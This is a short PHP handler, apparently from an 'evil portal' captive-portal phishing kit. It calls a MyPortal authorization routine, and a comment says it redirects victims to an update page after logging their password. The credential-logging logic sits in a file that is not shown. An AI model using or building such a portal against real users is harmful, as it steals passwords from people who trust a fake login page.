<?php
require_once 'MyPortal.php';
use evilportal\MyPortal;

$portal = new MyPortal();
$portal->handleAuthorization();

// Redirect to update page after logging the password
header('Location: update.php');
exit();
